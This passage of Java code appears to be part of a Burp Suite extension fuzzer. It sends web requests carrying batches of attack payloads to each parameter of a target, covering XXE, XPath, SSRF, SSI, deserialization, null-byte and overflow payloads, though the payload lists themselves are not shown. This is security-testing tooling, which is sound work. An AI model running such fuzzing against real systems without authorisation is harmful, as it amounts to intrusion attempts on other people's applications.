    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, stringformatPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Invalid String Format Payload: '" + stringformatPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with String Format Payload '" + stringformatPayload + "': " + e.getStackTrace());
    	}
    }

    
    // -------------------------- Test 17: Business Logic PAYLOADS -------------------- //
    logging.logToOutput("[ === Testing Business Logic PAYLOADS === ] ");
    for (String bPayload: BUSINESS_LOGIC_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, bPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Business Logic Payload: '" + bPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Business Logic Payload '" + bPayload + "': " + e.getStackTrace());
    	}
    }

// -------------------------- Test 18: Buffer Overflow PAYLOADS -------------------- //
    logging.logToOutput("[ === Testing Buffer Overflow PAYLOADS === ] ");
    for (String bufferPayload: BUFFER_OVERFLOW_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, bufferPayload, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();

            String result = "Buffer Overflow Payload: '" + bufferPayload.length() + " chars'";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // create request/response for organizer
            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            // set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("[ ======================================= ]");
            logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Buffer Overflow Payload '" + bufferPayload.length() + " chars': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 19: Integer Overflow PAYLOADS -------------------- //
    logging.logToOutput("[ === Testing Integer Overflow PAYLOADS === ] ");
    for (String intPayload: INTEGER_OVERFLOW_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, intPayload, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();

            String result = "Integer Overflow Payload: '" + intPayload + "'";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // create request/response for organizer
            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            // set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("[ ======================================= ]");
            logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Integer Overflow Payload '" + intPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 20: Unicode PAYLOADS -------------------- //
    logging.logToOutput("[ === Testing Unicode PAYLOADS === ] ");
    for (String unicodePayload: UNICODE_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, unicodePayload, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();

            String result = "Unicode Payload: '" + unicodePayload + "'";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // create request/response for organizer
            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            // set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("[ ======================================= ]");
            logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Unicode Payload '" + unicodePayload + "': " + e.getStackTrace());
        }
    }
    
    // -------------------------- Test 21: SSI PAYLOADS -------------------- //
    logging.logToOutput("[ === Testing Unicode PAYLOADS === ] ");
    for (String ssiPayload: SSI_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, ssiPayload, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();

            String result = "SSI Payload: '" + ssiPayload + "'";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // create request/response for organizer
            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            // set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("[ ======================================= ]");
            logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging.logToError("[ ======================================= ]");
            logging.logToError("Error with SSI Payload '" + ssiPayload + "': " + e.getStackTrace());
        }
    }

        // -------------------------- Test 21: XXE Injection -------------------- //
    logging.logToOutput("[ === Testing XXE PAYLOADS === ] ");
    for (String xxePayload: XXE_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, xxePayload, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            String result = "XXE Payload";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            requestResponseForOrganizer.annotations().setNotes(result);
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("Error with XXE Payload: " + e.getStackTrace());
        }
    }

        // -------------------------- Test 24: XPATH Injection -------------------- //
    logging.logToOutput("[ === Testing XPATH Injection PAYLOADS === ] ");
    for (String xpathPayload: XPATH_INJECTION_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, xpathPayload, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            String result = "XPATH Injection: '" + xpathPayload + "'";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            requestResponseForOrganizer.annotations().setNotes(result);
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("Error with XPATH Injection: " + e.getStackTrace());
        }
    }

    // -------------------------- Test 26: Deserialization Attack -------------------- //
    logging.logToOutput("[ === Testing Deserialization PAYLOADS === ] ");
    for (String deserPayload: DESERIALIZATION_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, deserPayload, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            String result = "Deserialization Attack";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            requestResponseForOrganizer.annotations().setNotes(result);
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("Error with Deserialization: " + e.getStackTrace());
        }
    }

    // -------------------------- Test 26: NULL BYTE Attack -------------------- //
    logging.logToOutput("[ === Testing NULL BYTE PAYLOADS === ] ");
    for (String nullPayload: NULLBYTE_PAYLOADS) {
        String newValue = originalValue + nullPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, newValue, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            String result = "NULL BYTE Attack";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            requestResponseForOrganizer.annotations().setNotes(result);
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("Error with NULL BYTE: " + nullPayload + e.getStackTrace());
        }
    }

    // -------------------------- Test 27: SSRF Attack -------------------- //
    logging.logToOutput("[ === Testing SSRF PAYLOADS === ] ");
    for (String ssrfPayload: SSRF_PAYLOADS) {
        //String newValue = originalValue + nullPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, ssrfPayload, param.type()
            )
        );

        try {
            var response = api.http().sendRequest(modifiedRequest);
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            String result = "SSRF Attack";
            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
            requestResponseForOrganizer.annotations().setNotes(result);
            api.organizer().sendToOrganizer(requestResponseForOrganizer);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging.logToError("Error with SSRF Payload: " + ssrfPayload + e.getStackTrace());
        }
    }

}
    
// ------------------------------------------------------------ //
// --------------- FUZZING ENDS ----------------------------- //

logging.logToOutput("[ ======================================= ]");
logging.logToOutput("[ === QUICK FUZZING DONE === ]");    
logging.logToOutput("[ ======================================= ]\n");
logging.logToOutput("Parameters tested: " + allParams.size() + "\nTotal Requests: " + totalRequests + "\nCheck the organizer tab for output");
